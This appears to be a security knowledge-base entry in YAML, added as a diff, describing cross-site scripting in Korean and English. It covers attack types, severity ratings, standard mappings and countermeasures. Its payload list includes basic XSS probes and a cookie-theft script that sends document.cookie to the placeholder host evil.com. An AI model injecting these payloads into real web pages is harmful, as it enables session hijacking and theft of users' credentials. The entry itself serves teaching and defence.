@@ -1,0 +1,149 @@
+# GR Atom: Cross-Site Scripting (XSS) Attack
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "ATK-INJECT-XSS-001"
+  name: "Cross-Site Scripting (XSS)"
+  normalization:
+    normalized_name: "xss cross site scripting"
+    normalization_version: "1.0"
+  aliases:
+    - "XSS"
+    - "크로스 사이트 스크립팅"
+    - "사이트 간 스크립팅"
+
+classification:
+  domain: security
+  type: technique
+  abstraction_level: 3
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone2"
+    tags: ["INJ", "EXPLOIT", "WEB", "XSS"]
+
+definition:
+  what: |
+    XSS는 공격자가 웹 페이지에 악성 JavaScript를 삽입하여 다른 사용자의
+    브라우저에서 실행시키는 취약점이다. 쿠키 탈취, 세션 하이재킹,
+    피싱, 악성코드 배포 등에 악용된다.
+  why: |
+    OWASP Top 10 단골 취약점으로, 사용자 신뢰를 악용하여 광범위한
+    피해를 유발한다. 웹 애플리케이션 어디에서나 발생할 수 있으며,
+    완전한 방어가 어렵다.
+  how: |
+    1. 공격자가 악성 스크립트를 입력/URL에 삽입
+    2. 취약한 서버가 스크립트를 그대로 페이지에 포함
+    3. 피해자가 해당 페이지 방문
+    4. 피해자 브라우저에서 악성 스크립트 실행
+    5. 쿠키 전송, 키로깅, 페이지 변조 등 수행
+
+relations:
+  structural:
+    is_a: ["GR-SEC-CON-00001"]  # Injection의 하위 개념
+  causal:
+    causes:
+      - "ATK-SESSION-HIJACK-001"  # 세션 하이재킹
+    enables:
+      - "ATK-AUTH-CSRF-001"       # CSRF와 연계
+  conditional:
+    requires:
+      - "TECH-LANG-HTML-001"       # HTML 이해
+      - "TECH-LANG-JAVASCRIPT-001" # JavaScript 이해
+      - "TECH-CONCEPT-DOM-001"     # DOM 이해
+  applicability:
+    applies_to:
+      - "INFRA-APP-WEBAPP-001"
+
+properties:
+  technical:
+    attack_types:
+      - name: "Stored XSS (Persistent)"
+        description: "악성 스크립트가 서버 DB에 저장"
+        severity: "HIGH"
+        example: "게시판, 댓글, 프로필"
+      - name: "Reflected XSS (Non-Persistent)"
+        description: "요청 파라미터가 응답에 반영"
+        severity: "MEDIUM"
+        example: "검색, 에러 메시지"
+      - name: "DOM-based XSS"
+        description: "클라이언트 측 DOM 조작으로 발생"
+        severity: "MEDIUM"
+        example: "location.hash, document.URL"
+    common_payloads:
+      basic:
+        - "<script>alert(1)</script>"
+        - "<img src=x onerror=alert(1)>"
+        - "<svg onload=alert(1)>"
+      cookie_theft:
+        - "<script>new Image().src='http://evil.com/?c='+document.cookie</script>"
+      event_handlers:
+        - "onmouseover"
+        - "onerror"
+        - "onload"
+        - "onfocus"
+    sinks:
+      dangerous:
+        - "innerHTML"
+        - "document.write()"
+        - "eval()"
+        - "setTimeout()"
+        - "location"
+  security:
+    impact:
+      confidentiality: "HIGH - 쿠키, 세션 탈취"
+      integrity: "MEDIUM - 페이지 변조"
+      availability: "LOW"
+    cvss_base: 6.1
+    mitre_attack:
+      technique_id: "T1059.007"
+      tactic: "Execution"
+    cwe_id: "CWE-79"
+    owasp: "A03:2021 - Injection"
+  countermeasures:
+    primary:
+      - id: "DEF-PREVENT-OUTPUTENC-001"
+        name: "Output Encoding"
+        effectiveness: "HIGH"
+      - id: "DEF-PREVENT-CSP-001"
+        name: "Content Security Policy"
+        effectiveness: "HIGH"
+    secondary:
+      - id: "TECH-CONCEPT-COOKIE-001"
+        name: "HttpOnly Cookie"
+        effectiveness: "MEDIUM"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "OWASP XSS Prevention Cheat Sheet"
+      - "CWE-79"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+    weaponization_risk: medium
+  ai:
+    embedding_text: |
+      XSS Cross-Site Scripting은 악성 JavaScript를 웹 페이지에 삽입하여
+      다른 사용자 브라우저에서 실행시키는 취약점이다. Stored, Reflected,
+      DOM-based 유형이 있으며, 쿠키 탈취, 세션 하이재킹에 사용된다.
+      Output Encoding, CSP, HttpOnly 쿠키로 방어한다.
+    search_keywords:
+      - "XSS"
+      - "Cross-Site Scripting"
+      - "크로스 사이트 스크립팅"
+      - "스크립트 삽입"
+    related_queries:
+      - "XSS란?"
+      - "XSS 공격 종류"
+      - "XSS 방어 방법"
+      - "Stored vs Reflected XSS"
